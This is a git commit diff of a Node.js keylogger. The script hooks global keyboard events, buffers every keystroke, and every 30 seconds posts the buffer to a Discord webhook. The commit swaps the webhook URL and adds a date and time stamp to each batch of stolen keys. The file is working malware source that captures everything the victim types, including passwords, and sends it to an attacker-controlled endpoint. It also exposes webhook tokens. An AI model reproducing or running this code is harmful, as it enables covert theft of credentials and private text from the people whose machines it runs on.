8dc26e851f61fce0e51f9b24c0a09e25756c827d
JUSTIN JEFFRE <113901194+PraMonDev@users.noreply.github.com>
2024-04-27 00:20:19 +0800

    keylogger.js

--- keylogger.js
+++ keylogger.js
@@ -1,55 +1,66 @@
-// https://discord.com/api/webhooks/1232172582002753606/MkkZC8PFYY1QSLQ-p9fhj5kwDJ0jyyaxQPT2DlP-QYQLH_JCtpKrhWAMW_sS8axHywG4
+// I added a Time and Date :)
 
-const GlobalKeyboardListener = require('node-global-key-listener').GlobalKeyboardListener
-const axios = require('axios')
+
+
+const GlobalKeyboardListener = require('node-global-key-listener').GlobalKeyboardListener;
+const axios = require('axios');
 
 const v = new GlobalKeyboardListener();
-var keystrokes = '';
-//Log every key that's pressed.
-v.addListener(function (e, down) {
-    if (e.state == "UP") {
+let keystrokes = '';
+
+// Function to get current date and time in a formatted string
+function getCurrentDateTime() {
+    const now = new Date();
+    const dateString = now.toDateString();
+    const timeString = now.toTimeString().split(' ')[0]; // Extract time part and remove timezone
+    return `${dateString} ${timeString}`;
+}
+
+// Log every key that's pressed.
+v.addListener(function (e) {
+    if (e.state === "UP") {
         switch (e.name) {
             case 'SPACE':
                 process.stdout.write(' ');
-                keystrokes += ' '
+                keystrokes += ' ';
                 break;
             case 'TAB':
                 process.stdout.write('<TAB>');
-                keystrokes += '<TAB>'
+                keystrokes += '<TAB>';
                 break;
             case 'RETURN':
                 process.stdout.write('<ENTER>');
-                keystrokes += '<ENTER>'
+                keystrokes += '<ENTER>';
                 break;
             default:
                 process.stdout.write(e.name);
-                keystrokes += e.name
+                keystrokes += e.name;
         }
     }
 });
 
-//Capture Windows + Space on Windows and Command + Space on Mac
+// Capture Windows + Space on Windows and Command + Space on Mac
 v.addListener(function (e, down) {
     if (
-        e.state == "DOWN" &&
-        e.name == "SPACE" &&
+        e.state === "DOWN" &&
+        e.name === "SPACE" &&
         (down["LEFT META"] || down["RIGHT META"])
     ) {
-        //call your function
+        // Call your function
         return true;
     }
 });
 
-//Capture ALT + F
+// Capture ALT + F
 v.addListener(function (e, down) {
-    if (e.state == "DOWN" && e.name == "F" && (down["LEFT ALT"] || down["RIGHT ALT"])) {
-        //call your function
+    if (e.state === "DOWN" && e.name === "F" && (down["LEFT ALT"] || down["RIGHT ALT"])) {
+        // Call your function
         return true;
     }
 });
 
-//Call one listener only once (demonstrating removeListener())
-calledOnce = function (e) {
+// Call one listener only once (demonstrating removeListener())
+const calledOnce = function (e) {
     console.log("only called once");
     v.removeListener(calledOnce);
 };
@@ -69,8 +80,9 @@ v.addListener(calledOnce);
 */
 
 setInterval(async () => {
-    await axios.post('https://discord.com/api/webhooks/1215668734279032893/QtgnuTpgUbJw9H4EhdyVLaM4S7rK_QTOdvrGZyOWpFV4Ot1QWXcX9O1M5exoR_p-Vog4', {
-        "content": keystrokes,
-    })
-    keystrokes = ''
-}, 1000 * 30)
+    const dateTime = getCurrentDateTime();
+    await axios.post('https://discord.com/api/webhooks/1232172582002753606/MkkZC8PFYY1QSLQ-p9fhj5kwDJ0jyyaxQPT2DlP-QYQLH_JCtpKrhWAMW_sS8axHywG4', {
+        "content": `**${dateTime}**\n${keystrokes}`, // Add date and time before keystrokes
+    });
+    keystrokes = '';
+}, 1000 * 30);
